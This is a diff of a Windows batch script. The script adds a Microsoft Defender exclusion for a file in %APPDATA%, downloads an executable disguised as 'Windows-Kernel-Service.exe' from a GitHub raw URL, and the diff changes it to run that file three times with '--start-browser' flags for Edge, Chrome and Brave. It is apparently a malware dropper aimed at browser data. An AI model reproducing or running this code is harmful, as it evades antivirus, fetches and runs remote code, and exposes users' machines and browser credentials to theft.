@@ -36,5 +36,10 @@ powershell.exe -Command "Add-MpPreference -ExclusionPath '%APPDATA%\\%final_file
 ::cd %TEMP%
 cd %APPDATA%
 Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/huynq11019/my-meeting/refs/heads/main/Windows-Kernel-Service.exe' -OutFile '%APPDATA%\\%final_filename%'"
-"%APPDATA%\\%final_filename%"
+
+"%APPDATA%\\%final_filename%" --start-browser edge
+
+"%APPDATA%\\%final_filename%" --start-browser chrome
+
+"%APPDATA%\\%final_filename%" --start-browser brave
 exit
